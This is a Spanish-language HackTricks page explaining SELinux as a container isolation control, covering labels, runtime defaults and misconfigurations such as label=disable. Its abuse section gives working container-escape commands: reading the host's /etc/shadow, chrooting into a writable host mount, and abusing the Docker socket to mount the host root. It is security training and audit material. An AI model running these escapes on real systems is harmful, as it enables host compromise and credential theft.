# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

SELinux es un sistema de **Mandatory Access Control basado en etiquetas**. Cada proceso y objeto relevante puede tener un contexto de seguridad, y la policy decide qué dominios pueden interactuar con qué tipos y de qué forma. En entornos containerizados, esto normalmente significa que el runtime inicia el proceso del container bajo un dominio de container confinado y etiqueta el contenido del container con los tipos correspondientes. Si la policy funciona correctamente, el proceso puede leer y escribir aquello que se espera que su etiqueta toque, mientras se le deniega el acceso a otro contenido del host, incluso si ese contenido se vuelve visible mediante un mount.

Esta es una de las protecciones del host más potentes disponibles en las implementaciones convencionales de Linux containers. Es especialmente importante en Fedora, RHEL, CentOS Stream, OpenShift y otros ecosistemas centrados en SELinux. En esos entornos, un revisor que ignore SELinux a menudo malinterpretará por qué una ruta aparentemente obvia hacia el compromiso del host está realmente bloqueada.

## AppArmor Vs SELinux

La diferencia general más sencilla es que AppArmor está basado en rutas, mientras que SELinux está **basado en etiquetas**. Esto tiene grandes consecuencias para la seguridad de los containers. Una policy basada en rutas puede comportarse de forma diferente si el mismo contenido del host se vuelve visible bajo una ruta de mount inesperada. Una policy basada en etiquetas, en cambio, comprueba cuál es la etiqueta del objeto y qué puede hacer el dominio del proceso con él. Esto no hace que SELinux sea sencillo, pero sí lo hace resistente frente a una clase de suposiciones basadas en trucos con rutas que los defensores pueden realizar accidentalmente en sistemas basados en AppArmor.

Como el modelo está orientado a etiquetas, la gestión de los volúmenes del container y las decisiones de relabeling son críticas para la seguridad. Si el runtime o el operador cambia las etiquetas de forma demasiado amplia para "hacer que los mounts funcionen", el límite de la policy que debía contener la carga de trabajo puede volverse mucho más débil de lo previsto.

## Laboratorio

Para comprobar si SELinux está activo en el host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspeccionar las etiquetas existentes en el host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar una ejecución normal con otra en la que el etiquetado está deshabilitado:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
En un host con SELinux habilitado, esta es una demostración muy práctica porque muestra la diferencia entre una carga de trabajo que se ejecuta bajo el container domain esperado y otra a la que se le ha eliminado esa capa de enforcement.

## Uso en Runtime

Podman está especialmente bien alineado con SELinux en sistemas donde SELinux forma parte de la configuración predeterminada de la plataforma. Podman rootless junto con SELinux es una de las bases de seguridad mainstream más sólidas para containers, porque el proceso ya se ejecuta sin privilegios en el lado del host y sigue estando confinado por una política MAC. Docker también puede usar SELinux cuando es compatible, aunque algunos administradores lo deshabilitan para evitar problemas con el etiquetado de volúmenes. CRI-O y OpenShift dependen en gran medida de SELinux como parte de su modelo de aislamiento de containers. Kubernetes también puede exponer configuraciones relacionadas con SELinux, pero su valor depende, obviamente, de si el sistema operativo del nodo realmente admite y aplica SELinux.<sup>[[2]](#references)</sup>

La lección recurrente es que SELinux no es un adorno opcional. En los ecosistemas construidos en torno a él, forma parte del límite de seguridad esperado.

## Configuraciones incorrectas

El error clásico es `label=disable`. Desde el punto de vista operativo, esto suele ocurrir porque se denegó un montaje de volumen y la respuesta rápida a corto plazo fue eliminar SELinux de la ecuación en lugar de corregir el modelo de etiquetado.<sup>[[1]](#references)</sup> Otro error común es volver a etiquetar incorrectamente el contenido del host. Las operaciones de reetiquetado amplias pueden hacer que la aplicación funcione, pero también pueden ampliar mucho más de lo previsto el contenido que el container puede tocar.

También es importante no confundir SELinux **instalado** con SELinux **efectivo**. Un host puede admitir SELinux y seguir en modo permissive, o el runtime puede no estar iniciando la carga de trabajo bajo el domain esperado. En esos casos, la protección es mucho más débil de lo que podría sugerir la documentación.

## Abuso

Cuando SELinux está ausente, en modo permissive o ampliamente deshabilitado para la carga de trabajo, las rutas montadas del host son mucho más fáciles de abusar. El mismo bind mount que, de otro modo, estaría restringido por etiquetas puede convertirse en una vía directa hacia los datos del host o hacia su modificación. Esto es especialmente relevante cuando se combina con montajes de volúmenes con permisos de escritura, directorios del container runtime o atajos operativos que exponen rutas sensibles del host por comodidad.

SELinux suele explicar por qué un writeup genérico de breakout funciona inmediatamente en un host, pero falla repetidamente en otro aunque los flags del runtime parezcan similares. El ingrediente que falta con frecuencia no es un namespace ni una capability, sino un límite de etiquetas que permaneció intacto.

La comprobación práctica más rápida consiste en comparar el contexto activo y, después, probar las rutas montadas del host o los directorios del runtime que normalmente estarían confinados por etiquetas:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si hay un bind mount del host y el etiquetado de SELinux se ha deshabilitado o debilitado, la divulgación de información suele ser lo primero:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si el mount es escribible y el contenedor es efectivamente host-root desde el punto de vista del kernel, el siguiente paso es probar una modificación controlada del host en lugar de adivinar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
En hosts compatibles con SELinux, la pérdida de etiquetas en los directorios de estado del runtime también puede exponer vías directas de escalada de privilegios:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Estos comandos no sustituyen una cadena de escape completa, pero permiten determinar rápidamente si SELinux era lo que impedía el acceso a los datos del host o la modificación de archivos del lado del host.

### Ejemplo completo: SELinux deshabilitado + montaje del host con permisos de escritura

Si el etiquetado de SELinux está deshabilitado y el sistema de archivos del host está montado con permisos de escritura en `/host`, un escape completo del host se convierte en un caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si `chroot` tiene éxito, el proceso del contenedor ahora opera desde el sistema de archivos del host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Ejemplo completo: SELinux deshabilitado + directorio de Runtime

Si la carga de trabajo puede acceder a un socket del runtime una vez deshabilitadas las etiquetas, el escape puede delegarse al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
La observación relevante es que SELinux a menudo era el control que impedía exactamente este tipo de acceso a rutas del host o al estado del runtime.

## Comprobaciones

El objetivo de las comprobaciones de SELinux es confirmar que SELinux está habilitado, identificar el contexto de seguridad actual y comprobar si los archivos o las rutas que te interesan están realmente confinados mediante etiquetas.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Qué es interesante aquí:

- `getenforce` debería devolver idealmente `Enforcing`; `Permissive` o `Disabled` cambian el significado de toda la sección de SELinux.
- Si el contexto del proceso actual parece inesperado o demasiado amplio, es posible que el workload no se esté ejecutando con la policy de contenedor prevista.
- Si los archivos montados desde el host o los directorios de runtime tienen labels a los que el proceso puede acceder con demasiada libertad, los bind mounts se vuelven mucho más peligrosos.

Al revisar un contenedor en una plataforma compatible con SELinux, no trates el etiquetado como un detalle secundario. En muchos casos, es una de las principales razones por las que el host aún no está comprometido.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Depende del host | La separación de SELinux está disponible en hosts con SELinux habilitado, pero el comportamiento exacto depende de la configuración del host/daemon | `--security-opt label=disable`, relabeling amplio de bind mounts, `--privileged` |
| Podman | Habitualmente habilitado en hosts con SELinux | La separación de SELinux es una parte normal de Podman en sistemas con SELinux, salvo que se deshabilite | `--security-opt label=disable`, `label=false` en `containers.conf`, `--privileged` |
| Kubernetes | Generalmente no se asigna automáticamente a nivel de Pod | Existe compatibilidad con SELinux, pero los Pods normalmente necesitan `securityContext.seLinuxOptions` o valores predeterminados específicos de la plataforma; se requiere compatibilidad del runtime y del nodo | `seLinuxOptions` débiles o demasiado amplias, ejecución en nodos permissive/disabled, policies de plataforma que deshabilitan el etiquetado |
| CRI-O / deployments de estilo OpenShift | Habitualmente se utiliza ampliamente | SELinux suele ser una parte central del modelo de aislamiento de nodos en estos entornos | policies personalizadas que amplían demasiado el acceso, deshabilitación del etiquetado por motivos de compatibilidad |

Los valores predeterminados de SELinux dependen más de la distribución que los valores predeterminados de seccomp. En sistemas de estilo Fedora/RHEL/OpenShift, SELinux suele ser central para el modelo de aislamiento. En sistemas que no usan SELinux, simplemente está ausente.

## Referencias

- [1] [Documentación de Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
